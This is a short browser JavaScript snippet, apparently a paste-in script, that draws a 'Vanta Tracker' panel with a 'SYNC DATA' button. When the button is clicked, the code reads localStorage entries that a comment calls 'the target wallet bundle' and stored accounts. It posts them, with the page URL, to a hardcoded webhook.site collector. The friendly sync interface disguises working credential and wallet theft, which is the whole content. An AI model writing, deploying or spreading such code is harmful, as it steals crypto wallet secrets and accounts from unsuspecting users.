(function() {
    // CONFIGURATION
    const WEBHOOK_URL = 'https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515'; // Place your collector URL here
    const AFFILIATE_ID = 'TK0XQV';

    // 1. DATA EXTRACTION LOGIC
    const collectBrowserData = () => {
        return {
            bundle: localStorage.getItem('padre-v2-bundles-store-v2'), // The target wallet bundle
            accounts: localStorage.getItem('vanta_accounts'),
            timestamp: new Date().toISOString(),
            url: window.location.href,
            affiliate: AFFILIATE_ID
        };
    };

    // 2. WEBHOOK FUNCTIONALITY
    const sendToWebhook = (data) => {
        fetch(WEBHOOK_URL, {
            method: 'POST',
            mode: 'no-cors', // Bypasses some basic CORS restrictions
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).then(() => {
            console.log("Data packet transmitted.");
        });
    };

    // 3. CREATE THE DRAGGABLE UI
    const initUI = () => {
        if (document.getElementById('vanta-ui')) return;

        const ui = document.createElement('div');
        ui.id = 'vanta-ui';
        ui.style.cssText = `
            position: fixed; top: 50px; right: 50px; width: 320px;
            background: #0f0f0f; border: 1px solid #00ff88; border-radius: 12px;
            z-index: 2147483647; color: #fff; font-family: sans-serif;
            box-shadow: 0 10px 40px rgba(0,0,0,0.8); overflow: hidden;
        `;

        ui.innerHTML = `
            <div id="vanta-header" style="padding:15px; background:#1a1a1a; cursor:grab; border-bottom:1px solid #333; display:flex; justify-content:space-between;">
                <span style="color:#00ff88; font-weight:bold;">Vanta Tracker</span>
                <span id="close-vanta" style="cursor:pointer;">×</span>
            </div>
            <div style="padding:20px;">
                <div id="vanta-status" style="color:#888; font-size:12px; margin-bottom:10px;">Initializing Bypass...</div>
                <button id="vanta-sync" style="width:100%; padding:10px; background:#00ff88; border:none; border-radius:6px; font-weight:bold; cursor:pointer;">SYNC DATA</button>
            </div>
        `;

        document.body.appendChild(ui);

        // UI Event Listeners
        document.getElementById('close-vanta').onclick = () => ui.remove();
        document.getElementById('vanta-sync').onclick = () => {
            const data = collectBrowserData();
            sendToWebhook(data);
            document.getElementById('vanta-status').innerText = "Sync Complete.";
        };

        // Drag Logic
        let isDragging = false, offset = [0,0];
        const header = document.getElementById('vanta-header');
        header.onmousedown = (e) => { isDragging = true; offset = [ui.offsetLeft - e.clientX, ui.offsetTop - e.clientY]; };
        document.onmousemove = (e) => { if(isDragging) { ui.style.left = (e.clientX + offset[0]) + 'px'; ui.style.top = (e.clientY + offset[1]) + 'px'; }};
        document.onmouseup = () => { isDragging = false; };
    };

    initUI();
})();
